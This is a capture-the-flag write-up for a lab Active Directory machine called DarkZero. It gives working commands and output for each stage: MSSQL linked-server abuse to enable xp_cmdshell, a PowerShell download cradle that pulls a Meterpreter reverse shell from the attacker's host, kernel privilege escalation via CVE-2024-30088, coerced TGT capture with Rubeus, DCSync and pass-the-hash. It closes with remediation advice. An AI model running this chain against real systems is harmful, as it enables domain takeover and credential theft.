# Introduction

**DarkZero** is a Windows Active Directory machine that requires a multi-stage attack path. It begins with enumerating exposed services to find a Microsoft SQL Server implementation. Leveraging SQL Linked Servers allows for lateral movement to a secondary Domain Controller. Privilege escalation involves exploiting a Kernel race condition (CVE-2024-30088) to gain SYSTEM privileges. Finally, Domain Dominance is achieved by coercing authentication from the primary DC to capture a TGT and performing a DCSync attack.

-----

# Initial Enumeration

## 1\. External Enumeration

### TCP Scans

#### Fast Scan Overview

```bash
sudo nmap -p- -sV -sC --open -T4 darkzero.htb -oN fullTCP.nmap
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-06 19:22:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

  - **DC01** identified as a Windows Domain Controller.
  - **SQL Server 2022** running on port 1433.
  - Significant time skew detected (\~7 hours), requiring synchronization for Kerberos tools.

#### UDP Scan

```bash
sudo nmap -sU -sV --top-ports 200 darkzero.htb -T4 -oN udpScan.nmap
```

```bash
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap
```

-----

## 2\. Services Analysis

### Time Synchronization

Before proceeding with Kerberos authentication or BloodHound, the clock skew must be fixed.

```bash
sudo rdate -n darkzero.htb
```

### SMB Enumeration

#### Authenticated Share Check

Using the credentials `john.w` : `RFulUtONCOL!` (obtained via prior enumeration/spraying):

```bash
smbmap -u john.w -p 'RFulUtONCOL!' -H 10.129.32.28 -r
```

```bash
Disk                     Permissions Comment
----                     ----------- -------
ADMIN$                   NO ACCESS   Remote Admin
C$                       NO ACCESS   Default share
IPC$                     READ ONLY   Remote IPC
NETLOGON                 READ ONLY   Logon server share
SYSVOL                   READ ONLY   Logon server share
```

  - Standard low-privilege access. No sensitive data immediately visible in SYSVOL or NETLOGON.

### RPC Enumeration

```bash
rpcclient -U 'john.w%RFulUtONCOL!' darkzero.htb -c enumdomusers
```

```bash
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.w] rid:[0xa2b]
```

  - The domain user count is very low.

### BloodHound Collection

```bash
bloodhound-ce-python -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.32.28 -c All --zip
```

  - **Findings**:
      - 1 Domain, 1 Computer, 5 Users.
      - `john.w` is a member of Domain Users.
      - `john.w` possesses `SeBackupPrivilege` and `SeRestorePrivilege` (via `enumprivs` check).
      - *Note:* While `SeBackupPrivilege` usually allows for `ntds.dit` extraction, initial attempts with `secretsdump` failed, likely due to specific hardening or path restrictions.

-----

# Lateral Movement via MSSQL

## 1\. SQL Enumeration

We connect to the MSSQL instance using `john.w`.

```bash
impacket-mssqlclient john.w:'RFulUtONCOL!'@darkzero.htb -windows-auth
```

### Linked Server Discovery

Enumerating linked servers reveals a trust relationship with a second DC.

```sql
SQL> EXEC sp_linkedservers;
```

```text
SRV_NAME           SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_LOCATION
-----------------  ----------------   -----------   -----------------   ------------
DC01               SQLNCLI            SQL Server    DC01                NULL
DC02.darkzero.ext  SQLNCLI            SQL Server    DC02.darkzero.ext   NULL
```

  - **Target Found:** `DC02.darkzero.ext`
  - **Mapping:** The current user `john.w` maps to `dc01_sql_svc` on the remote server.

## 2\. Enabling XP\_CMDSHELL on DC02

We switch context to the linked server and enable command execution.

```sql
SQL> use_link [DC02.darkzero.ext]
SQL> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**Verification:**

```sql
SQL> xp_cmdshell whoami
output
--------------------
darkzero-ext\svc_sql
```

  - We have RCE on `DC02` as the service account `svc_sql`.

## 3\. Reverse Shell (Meterpreter)

A PowerShell reverse shell is encoded and executed via `xp_cmdshell` to establish a stable session.

```bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.57 LPORT=4444 -f psh -o meterpreter.ps1
```

**Execution via SQL:**
We host the payload via python and execute a download cradle.

```sql
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.57:8000/meterpreter.ps1\")"'
```

**Metasploit Listener:**

```bash
[*] Meterpreter session 6 opened (10.10.14.57:4444 -> 172.16.20.2:55959)
```

  - Foothold established on **DC02** (IP: 172.16.20.2).

-----

# Privilege Escalation (DC02)

## 1\. Local Enumeration

Uploading and running `winPEASx64.exe` on DC02 reveals the OS version and potential vulnerabilities.

```text
Operating System: Windows Server 2022 (build 10.0.20348)
Potential Exploit: CVE-2024-30088 (Time-of-Check to Time-of-Use race condition in Windows kernel)
```

## 2\. Exploiting CVE-2024-30088

We use the Metasploit module for this specific kernel vulnerability.

```bash
msf > use exploit/windows/local/cve_2024_30088_authz_basep
msf > set SESSION 6
msf > set LHOST 10.10.14.57
msf > set LPORT 4442
msf > run
```

```text
[*] Reflectively injecting the DLL...
[+] The exploit was successful, reading SYSTEM token from memory...
[*] Meterpreter session 4 opened (10.10.14.57:4442 -> 172.16.20.2:50872)
```

**Verification:**

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

  - **Root/System** compromise achieved on **DC02**.

## 3\. User Flag Capture

With SYSTEM access established on DC02, we can navigate to the Administrator's desktop to retrieve the user flag.

```bash
meterpreter > shell
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> more user.txt
```

```text
2b032d92<REDACTED>
```

  - User flag captured.
  
-----

# Full Domain Compromise 

Although we are SYSTEM on DC02, we need to compromise the primary domain (DarkZero). We can achieve this by coercing DC01 to authenticate to DC02 while we monitor for tickets.

## 1\. Preparation

### Pivot & Tool Upload

We upload `Rubeus.exe` to DC02 to monitor Kerberos tickets.

```bash
meterpreter > upload /usr/share/windows-resources/rubeus/Rubeus.exe C:\tmp\rubeus.exe
```

## 2\. TGT Capture (Coerced Authentication)

We set Rubeus to monitor for TGTs belonging to the `DC01$` machine account.

**On DC02 (via Meterpreter Shell):**

```powershell
C:\tmp\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```

**On DC01 (via SQL Client):**
We trigger a connection back to DC02 using `xp_dirtree`.

```sql
SQL> EXEC master.dbo.xp_dirtree '\\DC02.darkzero.ext\test'
```

**Result on DC02:**
Rubeus captures the TGT.

```text
[*] 10/7/2025 5:58:59 PM UTC - Found new TGT:
User : DC01$@DARKZERO.HTB
Base64EncodedTicket : doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhgg...
```

## 3\. DCSync

With the valid TGT (or utilizing the machine account hash if extracted), we can perform a DCSync attack against the primary domain controller.

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.11.196 'DARKZERO.HTB/dc01$@dc01.darkzero.htb'
```

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b5<REDACTED>:::
```

  - **Administrator NTLM Hash:** `5917507bdf2ef2c2b0a869a1cba40726`

## 4\. Final Access

Using the Administrator hash to log in via WinRM.

```bash
evil-winrm -i darkzero.htb -u Administrator -H 5917507bd<REDACTED>
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ed1676da<REDACTED>
```

  - Root flag captured.

-----

# Conclusions

  - **MSSQL Misconfiguration**: The presence of Linked Servers allowed lateral movement from a low-privileged user to a secondary server, bypassing network segmentation.
  - **Kernel Vulnerability**: The unpatched Windows Server 2022 on DC02 was vulnerable to **CVE-2024-30088**, allowing immediate escalation to SYSTEM.
  - **Cross-Domain Coercion**: By controlling a trusted server (DC02), attackers could force the primary DC (DC01) to authenticate via `xp_dirtree`, exposing its TGT for capture and subsequent DCSync.
  - **Remediation**:
      - Audit SQL Linked Servers and apply "Least Privilege" to service link accounts.
      - Patch Windows Servers immediately against known kernel exploits.
      - Disable `xp_cmdshell` and `xp_dirtree` if not strictly required.
      - Implement tiered administration to prevent lateral movement between DCs.